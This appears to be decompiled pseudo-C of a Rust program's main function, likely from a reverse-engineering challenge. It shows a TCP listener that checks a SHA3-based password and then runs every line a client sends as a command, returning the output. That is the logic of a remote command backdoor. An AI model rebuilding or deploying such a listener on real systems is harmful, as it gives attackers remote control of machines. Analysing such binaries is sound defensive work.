void __noreturn harry::main()
{
  int v0; // edx
  __int64 v1; // rax
  unsigned int v2; // edx
  __int64 v3; // rax
  int v4; // edx
  unsigned int v5; // [rsp+8h] [rbp-170h] BYREF
  unsigned int v6; // [rsp+Ch] [rbp-16Ch] BYREF
  _BYTE *v7; // [rsp+10h] [rbp-168h] BYREF
  int v8; // [rsp+1Ch] [rbp-15Ch]
  _BYTE v9[24]; // [rsp+20h] [rbp-158h] BYREF
  char **v10; // [rsp+38h] [rbp-140h] BYREF
  __int64 (__fastcall *v11)(); // [rsp+40h] [rbp-138h]
  _BYTE **v12; // [rsp+68h] [rbp-110h] BYREF
  __int64 (__fastcall *v13)(); // [rsp+70h] [rbp-108h]
  __int64 v14; // [rsp+78h] [rbp-100h]
  __int64 v15; // [rsp+80h] [rbp-F8h] BYREF
  _BYTE *v16; // [rsp+88h] [rbp-F0h]
  __int128 v17; // [rsp+90h] [rbp-E8h] BYREF
  const char *v18; // [rsp+A0h] [rbp-D8h]
  __int128 v19; // [rsp+A8h] [rbp-D0h]
  __int64 v20; // [rsp+C0h] [rbp-B8h] BYREF
  __int64 v21; // [rsp+C8h] [rbp-B0h]
  __int64 v22; // [rsp+D0h] [rbp-A8h] BYREF
  int v23; // [rsp+D8h] [rbp-A0h]
  _OWORD v24[2]; // [rsp+E0h] [rbp-98h] BYREF
  _QWORD v25[3]; // [rsp+108h] [rbp-70h] BYREF
  _DWORD v26[2]; // [rsp+120h] [rbp-58h] BYREF
  __int128 v27; // [rsp+128h] [rbp-50h]
  __int128 v28; // [rsp+138h] [rbp-40h]

  v10 = &off_74000;
  v11 = <&T as core::fmt::Display>::fmt;
  core::fmt::Arguments::new_v1(&v17, &off_74010, 1LL, &v10, 1LL);
  alloc::fmt::format(v25, &v17);
  v20 = v25[0];
  v21 = v25[2];
  v22 = std::time::Instant::now();
  v23 = v0;
  while ( 1 )
  {
    while ( 1 )
    {
      v10 = (char **)&v20;
      v11 = <&T as core::fmt::Display>::fmt;
      core::fmt::Arguments::new_v1(&v17, &off_74020, 2LL, &v10, 1LL);
      std::io::stdio::_print(&v17);
      std::net::each_addr(&v17, v20, v21);
      core::result::Result<T,E>::map(&v10, &v17);
      v5 = core::result::Result<T,E>::expect(&v10);
      *(_QWORD *)&v17 = &off_74058;
      *((_QWORD *)&v17 + 1) = 1LL;
      v18 = aRustc1b198b3a1;
      v19 = 0LL;
      std::io::stdio::_print(&v17);
      std::net::tcp::TcpListener::accept(v26, &v5);
      if ( !v26[0] )
        break;
      *(_QWORD *)&v24[0] = v27;
      v10 = (char **)v24;
      v11 = <std::io::error::Error as core::fmt::Display>::fmt;
      core::fmt::Arguments::new_v1(&v17, &off_740E8, 2LL, &v10, 1LL);
      std::io::stdio::_print(&v17);
      core::ptr::drop_in_place<std::io::error::Error>(v24);
      core::ptr::drop_in_place<std::net::tcp::TcpStream>(v5);
    }
    v6 = v26[1];
    v24[1] = v28;
    v24[0] = v27;
    v10 = (char **)v24;
    v11 = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;
    core::fmt::Arguments::new_v1(&v17, &off_74068, 2LL, &v10, 1LL);
    std::io::stdio::_print(&v17);
    v8 = 0;
    while ( 1 )
    {
      std::io::buffered::bufreader::BufReader<R>::with_capacity(&v10, 0x2000LL, &v6);
      *(_QWORD *)v9 = 1LL;
      *(_OWORD *)&v9[8] = 0LL;
      std::io::append_to_string(&v15, v9, &v10);
      if ( v15 )
        goto LABEL_6;
      if ( !v16 )
        break;
      alloc::string::String::pop(v9);
      *(_QWORD *)&v17 = &off_740A8;
      *((_QWORD *)&v17 + 1) = 1LL;
      v18 = aRustc1b198b3a1;
      v19 = 0LL;
      std::io::stdio::_print(&v17);
      if ( !(unsigned __int8)harry::verify_sha3(*(__int64 *)v9, *(__int64 *)&v9[16])
        || (v1 = std::time::Instant::elapsed(&v22),
            (unsigned __int8)<core::time::Duration as core::cmp::PartialOrd>::partial_cmp(v1, v2, 1LL, 0LL) == 0xFF) )
      {
        v22 = std::time::Instant::now();
        v23 = v4;
        v7 = v9;
        v12 = &v7;
        v13 = <&T as core::fmt::Display>::fmt;
        core::fmt::Arguments::new_v1(&v17, &off_740B8, 2LL, &v12, 1LL);
        std::io::stdio::_print(&v17);
      }
      else
      {
        *(_QWORD *)&v17 = &off_740D8;
        *((_QWORD *)&v17 + 1) = 1LL;
        v18 = aRustc1b198b3a1;
        v19 = 0LL;
        std::io::stdio::_print(&v17);
        <std::net::tcp::TcpStream as std::io::Write>::write(&v17, &v6, aAuthenticated, 15LL);
        v3 = core::ptr::drop_in_place<core::result::Result<usize,std::io::error::Error>>(&v17);
        LOBYTE(v3) = 1;
        v8 = v3;
      }
      while ( 2 )
      {
        core::ptr::drop_in_place<alloc::string::String>(v9);
        core::ptr::drop_in_place<std::io::buffered::bufreader::BufReader<&[u8]>>(v10, v11);
        if ( (v8 & 1) != 0 )
        {
          while ( 1 )
          {
            std::io::buffered::bufreader::BufReader<R>::with_capacity(&v10, 0x2000LL, &v6);
            *(_QWORD *)v9 = 1LL;
            *(_OWORD *)&v9[8] = 0LL;
            std::io::append_to_string(&v15, v9, &v10);
            if ( v15 )
              break;
            if ( !v16 )
              goto LABEL_16;
            alloc::string::String::pop(v9);
            v18 = *(const char **)&v9[16];
            v17 = *(_OWORD *)v9;
            harry::exec((__int64)&v12, (__int64 *)&v17);
            <std::net::tcp::TcpStream as std::io::Write>::write(&v17, &v6, v12, v14);
            core::ptr::drop_in_place<core::result::Result<usize,std::io::error::Error>>(&v17);
            core::ptr::drop_in_place<alloc::string::String>(&v12);
            core::ptr::drop_in_place<std::io::buffered::bufreader::BufReader<&[u8]>>(v10, v11);
          }
LABEL_6:
          v7 = v16;
          v12 = &v7;
          v13 = <std::io::error::Error as core::fmt::Display>::fmt;
          core::fmt::Arguments::new_v1(&v17, &off_740E8, 2LL, &v12, 1LL);
          std::io::stdio::_print(&v17);
          core::ptr::drop_in_place<std::io::error::Error>(&v7);
          continue;
        }
        break;
      }
    }
LABEL_16:
    v12 = (_BYTE **)v24;
    v13 = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;
    core::fmt::Arguments::new_v1(&v17, &off_74088, 2LL, &v12, 1LL);
    std::io::stdio::_print(&v17);
    core::ptr::drop_in_place<alloc::string::String>(v9);
    core::ptr::drop_in_place<std::io::buffered::bufreader::BufReader<&[u8]>>(v10, v11);
    core::ptr::drop_in_place<std::net::tcp::TcpStream>(v6);
    core::ptr::drop_in_place<std::net::tcp::TcpStream>(v5);
  }
}